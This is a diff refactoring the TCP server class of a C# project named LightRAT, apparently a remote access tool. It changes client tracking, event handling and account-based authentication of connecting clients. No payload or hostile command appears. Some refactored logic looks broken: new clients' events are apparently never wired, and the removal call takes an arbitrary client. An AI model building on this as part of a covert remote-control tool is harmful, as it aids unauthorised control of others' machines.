@@ -1,27 +1,25 @@
 ﻿using System;
+using System.Collections.Concurrent;
 using System.Net;
 using System.Net.Sockets;
-using LightRAT.Core.Data;using System.Collections.Generic;
+using LightRAT.Data;
+using System.Collections.Generic;
+using LightRAT.Network.EventArgs;
+using LightRAT.Network.Packets;
 
-using LightRAT.Core.Network.Packets;
-
-namespace LightRAT.Core.Network
+namespace LightRAT.Network
 {
     public class Server : IDisposable
     {
-        private readonly object _clientStateChangedLock = new object();
-
         public IPEndPoint ServerEndPoint { get; set; }
-        public Socket InternalSocket { get; } = new Socket(AddressFamily.InterNetwork ,SocketType.Stream, ProtocolType.Tcp);
-        public List<Client> ConnectedClients { get; private set; } = new List<Client>();
+        public Socket InternalSocket { get; } = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+        public ConcurrentBag<Client> ConnectedClients { get; private set; } 
+                                                      = new ConcurrentBag<Client>();
         public List<Account> AllowedAccounts { get; private set; } = new List<Account>();
         public bool IsDisposed { get; private set; }
 
-        public delegate void ReceiveDataEventHandler(Server server, Client client, IPacket packet);
-        public event ReceiveDataEventHandler ClientReceiveDataEvent;
-
-        public delegate void StateChangeEventHandler(Server server, Client client, ClientState state);
-        public event StateChangeEventHandler ClientStateChangeEvent;
+        public event EventHandler<ReceivePacketArgs> OnClientPacketReceive;
+        public event EventHandler OnClientDisconnect;
 
         public Server(string ip, int port, Account account)
         {
@@ -41,47 +39,46 @@ namespace LightRAT.Core.Network
             {
                 if (ex.ErrorCode == (int)SocketError.AddressAlreadyInUse)
                     throw new InvalidOperationException("The selected port is already used by another process");
-                else
-                    throw new NotSupportedException("oops unexpected error was thrown please report this issue to the developer.");
+
+               throw new NotSupportedException("oops unexpected error was thrown please report this issue to the developer.");
             }  
         }
         private void EndAccepting(IAsyncResult result)
         {
             var client = new Client(InternalSocket.EndAccept(result));
-            AddClient(client);
             client.StartReceive();
             InternalSocket.BeginAccept(EndAccepting, null);
         }
 
         public void AddClient(Client client)
         {
-            lock (_clientStateChangedLock)
-            {
-                client.ReceiveDataEvent += OnClientReceive;
-                client.StateChangeEvent += OnClientStateChange; ;
-                ConnectedClients.Add(client);
-            }
+            client.OnPacketReceive += Client_OnPacketReceive;
+            client.OnDisconnect += Client_OnDisconnect;
+            ConnectedClients.Add(client);
         }
         public void RemoveClient(Client client)
         {
-            lock (_clientStateChangedLock)
+            client.OnPacketReceive -= Client_OnPacketReceive;
+            client.OnDisconnect -= Client_OnDisconnect;
+            ConnectedClients.TryTake(out client);
+            client.Dispose();
+        }
+
+        private void Client_OnPacketReceive(object sender, ReceivePacketArgs e)
+        {
+            if (e.Packet is AuthenticationPacket)
             {
-                client.ReceiveDataEvent -= OnClientReceive;
-                client.StateChangeEvent -= OnClientStateChange;
-                ConnectedClients.Remove(client);
-                client.Dispose();
+                var account = ((AuthenticationPacket) e.Packet).Account;
+
+                if (AllowedAccounts.Contains(account))
+                    AddClient((Client) sender);
+                else
+                    RemoveClient((Client) sender);
             }
+            else
+                OnClientPacketReceive(this, e);
         }
-
-
-        private void OnClientReceive(Client client, IPacket packet)
-        {
-            ClientReceiveDataEvent?.Invoke(this, client, packet);
-        }
-        private void OnClientStateChange(Client client, ClientState state)
-        {
-            ClientStateChangeEvent?.Invoke(this, client, state);
-        }
+        private void Client_OnDisconnect(object sender, System.EventArgs e) => RemoveClient((Client)sender);
 
         public void Dispose()
         {
